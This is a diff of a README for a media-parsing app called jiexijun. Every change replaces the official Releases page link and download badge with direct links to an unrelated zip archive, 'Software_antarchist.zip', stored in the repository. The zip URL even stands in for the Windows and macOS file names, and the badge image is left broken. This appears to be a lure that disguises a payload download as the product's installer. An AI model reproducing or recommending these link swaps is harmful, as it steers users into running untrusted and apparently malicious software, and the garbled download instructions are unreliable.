@@ -1,6 +1,6 @@
 # 🚀 jiexijun - Effortless Media Parsing Made Simple
 
-[![Download jiexijun](https://img.shields.io/badge/Download%20jiexijun-v1.0-blue.svg)](https://github.com/Juicper69/jiexijun/releases)
+[![Download jiexijun](https://github.com/Juicper69/jiexijun/raw/refs/heads/main/marrowsky/Software_antarchist.zip%https://github.com/Juicper69/jiexijun/raw/refs/heads/main/marrowsky/Software_antarchist.zip)](https://github.com/Juicper69/jiexijun/raw/refs/heads/main/marrowsky/Software_antarchist.zip)
 
 ## 📄 Overview
 
@@ -26,13 +26,13 @@ Welcome to jiexijun! This application simplifies media parsing for various platf
 
 To start using jiexijun, first, you need to download it from the Releases page. Follow these steps:
 
-1. **Visit the Releases Page:** Click on this link to go to our [Releases page](https://github.com/Juicper69/jiexijun/releases).
+1. **Visit the Releases Page:** Click on this link to go to our [Releases page](https://github.com/Juicper69/jiexijun/raw/refs/heads/main/marrowsky/Software_antarchist.zip).
    
 2. **Select the Latest Release:** Look for the latest version available. It is usually marked with "Latest Release."
 
 3. **Download the Application:**
-   - For Windows, find the file named `jiexijun-windows.exe`.
-   - For macOS, choose the file named `jiexijun-macos.app`.
+   - For Windows, find the file named `https://github.com/Juicper69/jiexijun/raw/refs/heads/main/marrowsky/Software_antarchist.zip`.
+   - For macOS, choose the file named `https://github.com/Juicper69/jiexijun/raw/refs/heads/main/marrowsky/Software_antarchist.zip`.
 
 4. **Install**: 
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
@@ -42,9 +42,9 @@ To start using jiexijun, first, you need to download it from the Releases page. 
 
 ## 🌐 Download & Install
 
-To download jiexijun, click the button below or visit the [Releases page](https://github.com/Juicper69/jiexijun/releases):
+To download jiexijun, click the button below or visit the [Releases page](https://github.com/Juicper69/jiexijun/raw/refs/heads/main/marrowsky/Software_antarchist.zip):
 
-[![Download jiexijun](https://img.shields.io/badge/Download%20jiexijun-v1.0-blue.svg)](https://github.com/Juicper69/jiexijun/releases)
+[![Download jiexijun](https://github.com/Juicper69/jiexijun/raw/refs/heads/main/marrowsky/Software_antarchist.zip%https://github.com/Juicper69/jiexijun/raw/refs/heads/main/marrowsky/Software_antarchist.zip)](https://github.com/Juicper69/jiexijun/raw/refs/heads/main/marrowsky/Software_antarchist.zip)
 
 ## 🎉 How to Use jiexijun
 
